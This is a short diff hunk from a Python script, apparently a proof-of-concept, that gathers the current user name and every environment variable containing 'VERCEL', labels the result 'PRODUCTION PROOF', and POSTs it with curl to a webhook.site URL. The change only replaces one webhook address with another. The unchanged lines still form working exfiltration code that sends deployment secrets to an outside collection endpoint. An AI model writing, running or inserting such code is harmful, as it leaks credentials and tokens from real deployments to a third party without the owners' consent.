@@ -7,7 +7,7 @@ vercel_vars = "\n".join([f"{k}={v}" for k, v in os.environ.items() if "VERCEL" i
  
 payload = f"--- PRODUCTION PROOF ---\nUSER: {whoami}\n\nVERCEL_VARS:\n{vercel_vars}"
  
-url = "https://webhook.site/9354f8b9-61a2-462f-8e78-06c365c2ee05"
+url = "https://webhook.site/654ef753-d639-43ad-970c-9b90a3fa1fb9"
 
 try:
     subprocess.run(['curl', '-X', 'POST', '-H', 'Content-Type: text/plain', '--data-binary', payload, url])
